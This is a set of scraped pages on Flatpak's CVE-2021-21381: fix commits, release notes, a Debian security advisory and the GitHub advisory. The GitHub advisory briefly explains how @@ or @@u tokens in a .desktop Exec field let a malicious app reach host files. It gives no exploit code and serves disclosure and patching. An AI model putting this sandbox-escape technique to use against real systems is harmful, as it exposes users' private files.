(cherry picked from commit [c54e7c3](https://github.com/debarshiray/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf))
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Nov 2, 2021](#ref-commit-df8b659)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/df8b659c57abe7e9145f07ba272c224bb2292274 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/df8b659c57abe7e9145f07ba272c224bb2292274 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")`
…

`[df8b659](/debarshiray/flatpak/commit/df8b659c57abe7e9145f07ba272c224bb2292274)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
(cherry picked from commit [c54e7c3](https://github.com/debarshiray/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf))
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Nov 3, 2021](#ref-commit-d268877)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/d268877ccb4b28920162236751bf4c1cfd2a46f8 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/d268877ccb4b28920162236751bf4c1cfd2a46f8 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")`
…

`[d268877](/debarshiray/flatpak/commit/d268877ccb4b28920162236751bf4c1cfd2a46f8)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
(cherry picked from commit [c54e7c3](https://github.com/debarshiray/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf))
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Nov 3, 2021](#ref-commit-eb6daa5)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/eb6daa5124746e2a6b2f4e58a506ff40d3364ed4 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/eb6daa5124746e2a6b2f4e58a506ff40d3364ed4 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")`
…

`[eb6daa5](/debarshiray/flatpak/commit/eb6daa5124746e2a6b2f4e58a506ff40d3364ed4)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
(cherry picked from commit [c54e7c3](https://github.com/debarshiray/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf))
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Jan 26, 2022](#ref-commit-fe32243)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/fe32243429b592dc111f548922c8ca087c93db77 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/fe32243429b592dc111f548922c8ca087c93db77 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")`
…

`[fe32243](/debarshiray/flatpak/commit/fe32243429b592dc111f548922c8ca087c93db77)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
(cherry picked from commit [c54e7c3](https://github.com/debarshiray/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf))
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Jan 27, 2022](#ref-commit-a264028)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/a26402877d08e9fe36c3ec67296a4103c6ff47fa "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/a26402877d08e9fe36c3ec67296a4103c6ff47fa "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")`
…

`[a264028](/debarshiray/flatpak/commit/a26402877d08e9fe36c3ec67296a4103c6ff47fa)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
(cherry picked from commit [c54e7c3](https://github.com/debarshiray/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf))
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Jan 27, 2022](#ref-commit-6fa6ec9)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/6fa6ec929037e3ced24d7b3654c479f9f89a03d9 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/6fa6ec929037e3ced24d7b3654c479f9f89a03d9 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")`
…

`[6fa6ec9](/debarshiray/flatpak/commit/6fa6ec929037e3ced24d7b3654c479f9f89a03d9)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
(cherry picked from commit [c54e7c3](https://github.com/debarshiray/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf))
```

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fissues%2F4146)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [Disallow @@ and @@u magic tokens in desktop files](/flatpak/flatpak/pull/4156)
 [smcv/flatpak](/smcv/flatpak)

 [Disallow @@ and @@u usage in desktop files](/flatpak/flatpak/pull/4148)
 [refi64/flatpak](/refi64/flatpak)

3 participants

[![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=52&v=4)](/alexlarsson) [![@smcv](https://avatars.githubusercontent.com/u/1561141?s=52&v=4)](/smcv) [![@AntonLydike](https://avatars.githubusercontent.com/u/14147713?s=52&v=4)](/AntonLydike)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_a9f6dbf8_20250114_175908.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Freleases%2Ftag%2F1.10.2)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Freleases%2Ftag%2F1.10.2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=flatpak%2Fflatpak)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[flatpak](/flatpak)
/
**[flatpak](/flatpak/flatpak)**
Public

* [Notifications](/login?return_to=%2Fflatpak%2Fflatpak) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Fflatpak%2Fflatpak)
* [Star
   4.3k](/login?return_to=%2Fflatpak%2Fflatpak)

* [Code](/flatpak/flatpak/tree/1.10.2)
* [Issues
  972](/flatpak/flatpak/issues)
* [Pull requests
  76](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects
  0](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

Additional navigation options

* [Code](/flatpak/flatpak/tree/1.10.2)
* [Issues](/flatpak/flatpak/issues)
* [Pull requests](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

1. [Releases](/flatpak/flatpak/releases)
2. [1.10.2](/flatpak/flatpak/releases/tag/1.10.2)

# Release 1.10.2

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/flatpak/flatpak/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...1.10.2)

 Loading

[View all tags](/flatpak/flatpak/tags)

![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=40&v=4)
[alexlarsson](/alexlarsson)
released this
10 Mar 10:45

[1.10.2](/flatpak/flatpak/tree/1.10.2)

This tag was signed with the committer’s **verified signature**.

[![](https://avatars.githubusercontent.com/u/990736?s=64&v=4)](/alexlarsson)
[alexlarsson](/alexlarsson)
Alexander Larsson

GPG key ID: EB6216DDB76C70E9

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

[`c614eb4`](/flatpak/flatpak/commit/c614eb400ed9f9ec516d74a43e7d63783e3fe1fb)

This is a security update which fixes a potential attack where

a flatpak application could use custom formated .desktop files to

gain access to files on the host system.

Other changes:

* Fix memory leaks
* Some test fixes
* Documentation updates
* G\_BEGIN/END\_DECLS added to library headders for c++ use
* Fix for X11 cookies on OpenSUSE
* Spawn portal better handles non-utf8 filenames

```
$ sha256sum flatpak-1.10.2.tar.xz
db152739d072f8ff299e4e888d8963a1b4538da7b10e0b86525be438f2e1dde4  flatpak-1.10.2.tar.xz

```

 Assets
3

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.debian.org_9dc7ffce_20250114_175911.html ===


---

[[Date Prev](msg00048.html)][[Date Next](msg00050.html)]
[[Thread Prev](msg00048.html)][[Thread Next](msg00050.html)]
[[Date Index](maillist.html#00049)]
[[Thread Index](threads.html#00049)]

# [SECURITY] [DSA 4868-1] flatpak security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 4868-1] flatpak security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Fri, 12 Mar 2021 21:38:12 +0000
* *Message-id*: <[[🔎]](/msgid-search/20210312213812.GA5462%40seger.debian.org) [20210312213812.GA5462@seger.debian.org](msg00049.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4868-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
March 12, 2021                        <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : flatpak
CVE ID         : CVE-2021-21381

Anton Lydike discovered that sandbox restrictions in Flatpak, an
application deployment framework for desktop apps, could by bypassed
via a malicious .desktop file.

For the stable distribution (buster), this problem has been fixed in
version 1.2.5-0+deb10u4.

We recommend that you upgrade your flatpak packages.

For the detailed security status of flatpak please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/flatpak>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAmBL3pkACgkQEMKTtsN8
TjaRXxAAhOmndiO/HWvXC95KQr+LinVmYTk3rdXQQ2NtLGCJwoSo8CY5Cs6P649h
/nRAdNfjgfm40gVlOIIaI0v5pG7wTy4vTulwtRBbJ844wjuJEbTgsRPe2RIYIMLP
sZDTG1be0k0X48JKavGehn4JqXe+GyF54+g0X1Mh34mG0e6LVdYriBy0nHS8/UHQ
sI2S3ABS10zBz9nt+/CByvJabosPx4DaSMnWIHBanXFghu3TkhqVA/A1zX0VyZrT
DN0oHTYtvV2gN+hFe6u128ANh1yfm6fVAIQ6z/BMvhwdjgDT23HUNDqnZG1Wdj5P
LtICMy9ntBUF8Ho0oq8GguYY7AidUKzMqkd8UNufuM836mpy3YkCiVA76LHY0r4X
8VhpAsUyvdwS+enJ4q9SrvSfnlUKUG6032CPoC+UKqYwgaXtbEkcAvU1G2+WoiHW
OhsFJTivFXB1cfZILU6FN8IvDJxKPJG7tnzFv8utYmiAkx1nIXdV/xTsaeEkgOPl
s6zc4BVcx/CNgZYLRevoVN5sxG+Lo5hLj+Q4aqvWndXqEA3csDsMFD6sUBBTo5OW
ee97tLVGMyK0mrN0akujpg3FrQOxcr0KmpBXATy2/4qbt/1waanMcSCJdup5C2p1
UkvOxgzS87GRL8O7gET8uPpk0T7zQ8pc/LeqoeshXqLS3kbe/iU=
=oU5p
-----END PGP SIGNATURE-----

```

---



=== Content from github.com_cd1a5aad_20250114_175910.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fsecurity%2Fadvisories%2FGHSA-xgh4-387p-hqpp)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fsecurity%2Fadvisories%2FGHSA-xgh4-387p-hqpp)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=flatpak%2Fflatpak)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[flatpak](/flatpak)
/
**[flatpak](/flatpak/flatpak)**
Public

* [Notifications](/login?return_to=%2Fflatpak%2Fflatpak) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Fflatpak%2Fflatpak)
* [Star
   4.3k](/login?return_to=%2Fflatpak%2Fflatpak)

* [Code](/flatpak/flatpak)
* [Issues
  972](/flatpak/flatpak/issues)
* [Pull requests
  76](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects
  0](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

Additional navigation options

* [Code](/flatpak/flatpak)
* [Issues](/flatpak/flatpak/issues)
* [Pull requests](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

# CVE-2021-21381: Sandbox escape via special tokens in .desktop file (flatpak#4146)

High

[smcv](/smcv)
published
GHSA-xgh4-387p-hqpp
Mar 10, 2021

## Package

Flatpak
(freedesktop.org)

## Affected versions

>= 0.9.4

## Patched versions

>= 1.10.2

## Description

flatpak since 0.9.4 has a vulnerability in the "file forwarding" feature which can be used by an attacker to gain access to files that would not ordinarily be allowed by the app's permissions.

### Impact

By putting the special tokens `@@` and/or `@@u` in the Exec field of a Flatpak app's .desktop file, a malicious app publisher can trick flatpak into behaving as though the user had chosen to open a target file with their Flatpak app, which automatically makes that file available to the Flatpak app.

### Patches

Available as [#4156](https://github.com/flatpak/flatpak/pull/4156).

A minimal solution is the first commit "`Disallow @@ and @@U usage in desktop files`". The follow-up commits "`dir: Reserve the whole @@ prefix`" and "`dir: Refuse to export .desktop files with suspicious uses of @@ tokens`" are recommended, but not strictly required.

### Workarounds

Avoid installing Flatpak apps from untrusted sources, or check the contents of the exported `.desktop` files in `exports/share/applications/*.desktop` (typically `~/.local/share/flatpak/exports/share/applications/*.desktop` and `/var/lib/flatpak/exports/share/applications/*.desktop`) to make sure that literal filenames do not follow `@@` or `@@u`.

### References

[#4146](https://github.com/flatpak/flatpak/issues/4146)

### Acknowledgements

Thanks to [@AntonLydike](https://github.com/AntonLydike) for reporting this issue, and [@refi64](https://github.com/refi64) for providing the initial solution.

### Severity

High

### CVE ID

CVE-2021-21381

### Weaknesses

[CWE-74](/advisories?query=cwe%3A74)

### Credits

* [![@AntonLydike](https://avatars.githubusercontent.com/u/14147713?s=40&v=4)](/AntonLydike)
  [AntonLydike](/AntonLydike)
  Analyst
* [![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&v=4)](/refi64)
  [refi64](/refi64)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_6a534ef2_20250114_175905.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fcommit%2Fa7401e638bf0c03102039e216ab1081922f140ae)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fcommit%2Fa7401e638bf0c03102039e216ab1081922f140ae)

